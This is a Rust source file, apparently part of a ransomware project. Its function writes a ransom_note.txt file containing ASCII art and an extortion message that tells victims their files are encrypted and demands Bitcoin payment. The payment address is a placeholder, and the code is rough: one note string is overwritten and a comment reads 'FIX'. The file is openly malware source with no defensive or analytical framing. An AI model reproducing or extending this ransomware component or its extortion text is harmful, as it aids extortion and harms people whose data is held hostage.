use std::fs::File;
use std::path::Path;
use std::io::Write;
use crate::utils::logger::Logger;

/// Creates ransom note and writes to file, FIX
pub fn generate_note(logger: &Logger, path: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut note = String::new();

    note.push_str("|------------------------------------------------------|\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡄⣖⣶⣰⢄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⣪⡽⣖⡻⣏⠷⣯⢷⣶⣥⠢⡄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣽⣻⣭⢳⣭⢳⣝⣯⢽⣞⡾⣽⣿⣷⣝⣂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣹⢷⣳⣏⣿⣹⣏⣿⣭⣻⣞⣿⡽⣾⣿⣿⡸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣼⣿⣿⠟⠉⠀⠈⠻⣿⠏⠁⠈⠻⢿⣿⣿⣷⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⣿⢿⡇⠀⠀⣠⣤⡀⠃⢀⣤⣀⠀⠘⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢿⣟⣮⠀⠀⠸⣿⣿⠗⠀⢸⣿⣿⠆⠀⣸⣿⣿⡚⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣡⣽⣿⡿⠾⢧⡀⠀⢉⡭⣴⣀⣄⣉⡁⠀⢠⣿⣿⣿⣟⡓⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡽⢛⡿⠁⠀⠀⠀⠈⠉⠷⠿⣎⣡⣶⠿⡿⠂⠀⠀⠀⠉⢿⣿⢇⡳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠠⣿⡯⣷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠂⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣦⠢⠐⣇⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⣧⡀⢀⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡼⣏⢤⣹⣇⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣧⣷⣮⣉⡛⠶⢦⣤⡤⢤⡔⢲⣭⡷⣟⣮⣟⢧⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡏⠀⠙⢦⣀⡀⣀⡼⠃⠘⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⡄⠀⠀⠈⠉⠁⠀⠀⠀⣹⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡟⢦⡀⠀⠀⠀⢀⡠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡙⠶⠶⠞⢋⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         |\n");
    note.push_str("|⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        |\n");
    note.push_str("|                                                      |\n");
    note.push_str("|                                                      |\n");
    note.push_str("| Greetings                                            |\n");
    note.push_str("|                                                      |\n");
    note.push_str("| You have been hacked.                                |\n");
    note.push_str("| All your files belong to me.                         |\n");
    note.push_str("| But don't fret, dear user. I'm a reasonable person.  |\n");
    note.push_str("| Pay 1 BTC and your data is yours again               |\n");
    note.push_str("| Or don't and never see your files again              |\n");
    note.push_str("|                                                      |\n");
    note.push_str("| Send money to following address                      |\n");
    note.push_str("| THISISARANDOMADDRESS                                 |\n");
    note.push_str("|                                                      |\n");
    note.push_str("| Your move.                                           |\n");
    note.push_str("| BonziBunny                                           |\n");
    note.push_str("|------------------------------------------------------|\n");

    let mut image = String::new();
    image.push_str("|--------------------------------------------------|\n");
    image.push_str("
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡄⣖⣶⣰⢄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⣪⡽⣖⡻⣏⠷⣯⢷⣶⣥⠢⡄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣽⣻⣭⢳⣭⢳⣝⣯⢽⣞⡾⣽⣿⣷⣝⣂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣹⢷⣳⣏⣿⣹⣏⣿⣭⣻⣞⣿⡽⣾⣿⣿⡸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣼⣿⣿⠟⠉⠀⠈⠻⣿⠏⠁⠈⠻⢿⣿⣿⣷⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⣿⢿⡇⠀⠀⣠⣤⡀⠃⢀⣤⣀⠀⠘⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢿⣟⣮⠀⠀⠸⣿⣿⠗⠀⢸⣿⣿⠆⠀⣸⣿⣿⡚⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣡⣽⣿⡿⠾⢧⡀⠀⢉⡭⣴⣀⣄⣉⡁⠀⢠⣿⣿⣿⣟⡓⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡽⢛⡿⠁⠀⠀⠀⠈⠉⠷⠿⣎⣡⣶⠿⡿⠂⠀⠀⠀⠉⢿⣿⢇⡳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠠⣿⡯⣷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠂⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣦⠢⠐⣇⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⣧⡀⢀⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡼⣏⢤⣹⣇⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣧⣷⣮⣉⡛⠶⢦⣤⡤⢤⡔⢲⣭⡷⣟⣮⣟⢧⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⢻⣿⣿⣿⣿⣿⣿⣶⣶⣿⣶⡿⣟⣷⣻⣽⣾⣿⣟⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⡷⣏⢎⠧⣟⠁⠈⠉⣻⠿⠿⢿⡿⢷⠿⣻⣍⡳⣜⣿⣿⣿⣿⣬⣢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣖⡿⢯⠽⣌⠃⣾⣃⣤⡴⣶⠻⢯⡝⣦⠵⣮⣾⢷⡻⣽⢯⢿⣿⣽⣟⡿⣷⣏⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣜⡿⢯⡝⣎⢩⣤⣿⣟⣯⢳⡽⣹⠿⢶⢻⢎⣝⣲⣉⣾⣽⣧⢟⣻⣼⣳⣟⡷⣽⣞⡿⣟⠣⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣶⡷⡾⣽⣳⢾⣛⢯⣳⢳⣮⢷⡻⣜⡇⣻⢿⣏⣾⣭⣳⣯⢷⣽⣾⣯⣷⢯⣷⣯⣟⣳⢯⣟⣿⢷⣾⣝⢆⠀⠀⠀⠀
⠀⢀⣤⣶⣳⢾⣹⢳⢧⣛⣮⣝⣮⣷⣿⢿⣿⣿⣷⠿⠷⠿⠿⠿⠿⠿⠟⡨⢅⢋⠟⡻⢛⡻⢿⣿⣿⣟⣾⣽⣻⣞⣿⣶⣝⢆⡀⠀
⠀⡞⣼⢯⣳⣏⡾⣯⣾⣽⣾⣿⡿⠟⠁⠀⠈⠉⠀⠀⠐⠀⠀⠀⠀⠁⠈⠀⠈⠈⠒⠡⢣⡝⣭⢿⣿⣿⣿⣷⣿⣾⢷⣯⢿⣧⡱⡄
⢸⣼⣿⣿⣳⣯⣿⣿⣿⡿⣿⣿⡃⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⡘⡼⣻⣿⡟⡿⢿⣿⣿⣿⣿⣿⣿⡗⡂
⠀⠫⡿⡿⢿⣿⣻⠽⠚⣇⣿⣿⣗⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⡀⠄⡠⢁⠚⣤⢳⣻⣿⣿⡟⡆⠉⠛⠹⣻⢿⣿⣋⠕⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣟⣆⢣⡘⡠⢄⢀⡀⢀⡀⠈⢠⠘⡰⢰⡘⡴⣩⢞⡶⢯⣿⣿⣿⣏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡗⣿⡿⣿⣿⣾⣧⣷⣱⢎⡶⣌⢧⡜⣧⢧⣯⣵⣣⡽⣶⡽⣾⣽⣿⣿⣿⣿⡦⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣾⢿⡹⢯⡿⣿⣿⣿⣿⣯⣷⣿⣯⣿⣽⣿⢾⣷⣻⣽⣷⣿⣿⣿⣿⣿⣯⣟⣿⡰⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣯⠛⣧⢻⡝⣿⣿⣿⣿⣿⣿⣿⢻⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⢳⣿⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⡏⣿⣟⣮⢷⣽⣳⣿⣿⣿⣿⢩⠋⠁⠈⠁⠑⢝⢿⣿⣿⣿⣿⣳⣟⡾⣽⣻⡾⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡿⣿⣯⣿⣾⣿⣿⣿⣿⡏⡇⠀⠀⠀⠀⠀⠀⡇⣿⣿⣿⣿⣷⣯⣿⣿⣿⢗⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣝⣿⣿⣿⣿⣿⣿⣿⣯⠹⡀⠀⠀⠀⠀⡼⣷⣿⣿⣿⣿⣿⣿⣿⢟⡵⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡿⣿⢿⡿⣻⢷⣱⡀⠀⢀⢴⣹⣿⢿⡿⣿⣿⣿⣿⣻⠧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⡔⣎⣿⣚⢧⣏⢷⡹⣮⡗⣻⣞⣧⢰⠀⢸⢸⡿⣽⢣⣟⢶⡹⢮⡝⣿⣻⣙⡒⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡤⢞⢯⣽⢞⡵⣫⡾⣞⣧⣿⣿⠷⣹⣾⡷⠚⠀⠈⠲⣿⣞⡳⣿⠿⣽⣣⢿⣶⣭⢳⣯⣓⢟⡦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠣⣿⣾⣋⣾⣿⣫⣷⣿⣿⠖⠋⠂⠀⠋⠀⠀⠀⠀⠀⠈⠀⠀⠋⠑⠻⡟⣷⣞⣿⣷⣜⣿⣞⡧⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠃⠩⠝⠋⠩⠜⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠌⠡⠳⠍⠠⠏⠀⠀⠀⠀⠀⠀⠀⠀
");


    let mut note = String::new();

    note.push_str("|--------------------------------------------------|\n");
    note.push_str("|                                                  |\n");
    note.push_str("|  Well, well, well... it looks like you've made   |\n");
    note.push_str("|  a little mistake.                               |\n");
    note.push_str("|                                                  |\n");
    note.push_str("|  You see, I've been watching... waiting...       |\n");
    note.push_str("|  lurking in the shadows of your system.          |\n");
    note.push_str("|  And now? Now, your files belong to me.          |\n");
    note.push_str("|  Consider them **spirited away**.                |\n");
    note.push_str("|                                                  |\n");
    note.push_str("|  But don't fret, dear user. I'm a reasonable     |\n");
    note.push_str("|  virus—I mean, businessman.                      |\n");
    note.push_str("|  For the low, low price of **0.1 BTC**, you      |\n");
    note.push_str("|  can see your precious data again.               |\n");
    note.push_str("|  Send the payment to _ ...                       |\n");
    note.push_str("|                                                  |\n");
    note.push_str("|  Or don't. I'm perfectly happy watching your     |\n");
    note.push_str("|  files rot in digital limbo.                     |\n");
    note.push_str("|  Oh, and don't bother trying to decrypt          |\n");
    note.push_str("|  anything—only I hold the scythe that can cut    |\n");
    note.push_str("|  through this encryption.                        |\n");
    note.push_str("|                                                  |\n");
    note.push_str("|  Your move.                                      |\n");
    note.push_str("|  - BonziBuddy, The Grim Reaper of Files 👻       |\n");
    note.push_str("|--------------------------------------------------|\n");


    let path: &Path = Path::new(path);

    // Create text file in path
    let note_path = path.join("ransom_note.txt");
    let mut file = File::create(note_path)?;
    file.write_all(image.as_bytes())?;
    file.write_all(note.as_bytes())?;

    logger.log("Ransom note generated");

    Ok(())
}